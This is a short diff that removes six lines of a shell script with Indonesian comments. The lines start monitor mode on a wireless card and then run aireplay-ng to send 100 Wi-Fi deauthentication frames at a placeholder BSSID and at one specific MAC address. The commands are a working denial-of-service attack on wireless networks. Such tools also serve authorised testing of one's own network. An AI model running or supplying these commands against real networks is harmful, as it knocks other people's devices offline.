@@ -1,6 +1,0 @@
-#sudo airmon-ng start wlan0 --channel 6
-# atau jika sudah dalam mode monitor
-
-sudo iwconfig wlan0mon channel 6
-sudo aireplay-ng --deauth 100 -a [BSSID_ANDA] wlan0mon
-sudo aireplay-ng --deauth 100 -a EC:E7:A2:47:FF:38 wlan0mon
